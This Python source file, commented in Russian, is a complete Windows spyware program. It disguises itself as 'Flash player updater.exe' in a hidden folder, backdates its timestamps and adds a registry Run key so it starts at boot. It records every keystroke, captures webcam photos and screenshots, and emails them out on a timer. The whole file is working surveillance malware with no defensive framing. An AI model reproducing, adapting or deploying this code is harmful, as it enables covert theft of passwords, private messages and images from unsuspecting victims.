from pynput.keyboard import Listener
import win32api
import os
import sys
import winshell
import mail
import winreg
import time
import threading
import pyautogui
import cv2 as cam


# --- ДОБАВЛЯЕМ В АВТОЗАПУСК НАХ ---#
def set_autorun():
    try:
        application = sys.argv[0]
        start_path = os.path.join(os.path.abspath(os.getcwd()), application)  # Получаем наше местонахождение

        copy2_path = "{}\\{}".format(winshell.my_documents(), "Adobe flash player")
        copy2_app = os.path.join(copy2_path, "Flash player updater.exe")

        if not os.path.exists(copy2_path):
            os.makedirs(copy2_path)

        win32api.CopyFile(start_path, copy2_app)  # Копируем приложение в папку с незамысловатым названием

        win32api.SetFileAttributes(copy2_path, 2)  # Делаем папку невидимой
        os.utime(copy2_app, (1282372620, 1282372620))  # Меняем дату создания папки
        os.utime(copy2_path, (1282372620, 1282372620))  # и программы

        startup_val = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_val, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key2change, "Flash player updater", 0, winreg.REG_SZ,start_path + " --quiet")  # Добавляем программу в автозагрузку с помощью ключа реестра
    except:
        pass

try:
    if sys.argv[1] == "--quiet":  # Если программа запущена с ключом, значит она уже в автозапуске
        pass
except IndexError:
    set_autorun()


# --------------------------------#


def main(sec):
    while True:
        try:
            webc = cam.VideoCapture(0)  # Пробуем тырить фотку с вебки
            ret, frame = webc.read()
            cam.imwrite('../../photo.png', frame)
            webc.release()
            screen = pyautogui.screenshot('../../screenshot.png')  # Тырим скрин
        except:
            pass
        mail.send_mail('../../text.txt', '../../screenshot.png', '../../photo.png')  # Отправляем письмо
        warning = ('Всё в английской раскладке. Для расшифровки,используй: http://raskl.ru\n')
        text = open('../../text.txt', 'w')
        text.write(warning)
        text.close()
        time.sleep(sec)


threading.Thread(
    target=lambda: main(50)).start()  # добавляем функцию в отедльный поток,чтобы продалжать стилить текст с клавы


def on_press(key):  # Пиздим и фильтруем текст с клавы
    word = '{0}'.format(key)
    word = word[:len(word) - 1][1:]
    if word == ('ey.shif') or word == ('ey.al') or word == ('ey.ctrl_') or word == ('ey.ente') or word == (
    'ey.alt_') or word == ('caps_loc') or word == ("\x03") or word == ("\x16") or word == ("ey.ctr"):
        word = ''
    elif word == ('ey.backspac'):
        word = ('[<-]')
    elif word == ('ey.spac'):
        word = ' '
    text = open('../../text.txt', 'a')
    text.write(word)


with Listener(on_press=on_press) as listener:
    listener.join()
